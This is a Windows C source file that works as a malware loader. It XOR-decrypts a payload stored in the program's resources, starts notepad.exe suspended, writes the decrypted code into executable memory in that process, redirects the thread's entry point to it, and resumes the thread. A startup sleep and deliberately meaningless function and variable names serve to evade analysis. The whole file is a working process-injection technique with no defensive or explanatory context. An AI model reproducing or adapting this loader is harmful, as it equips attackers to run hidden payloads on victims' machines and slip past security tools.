#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void helloworld(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void ccccdeckumcrpt(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
    for (DWORD aa = 0; aa < dancodeLen; aa++) {
        dancode[aa] ^= dkdan1e2y6[aa % dank1e2y6Len];
    }
}

int main() {
    Sleep(3000);

    char* dank1e6ENC;
    DWORD dank1e6ENCLen;
    helloworld("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);

    char* codfhu;
    DWORD codfhuLen;
    helloworld("dhanushcode56", &codfhu, &codfhuLen);

    ccccdeckumcrpt(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION procin = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &procin);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(procin.hThread, &ctx);

    LPVOID dankummm = VirtualAllocEx(procin.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    

    WriteProcessMemory(procin.hProcess, dankummm, codfhu, codfhuLen, NULL);
    // Update entry point
    ctx.Rcx = (DWORD64)dankummm; 
    SetThreadContext(procin.hThread, &ctx);

    ResumeThread(procin.hThread); 

    
    CloseHandle(procin.hThread);
    CloseHandle(procin.hProcess);

    return 0;
}
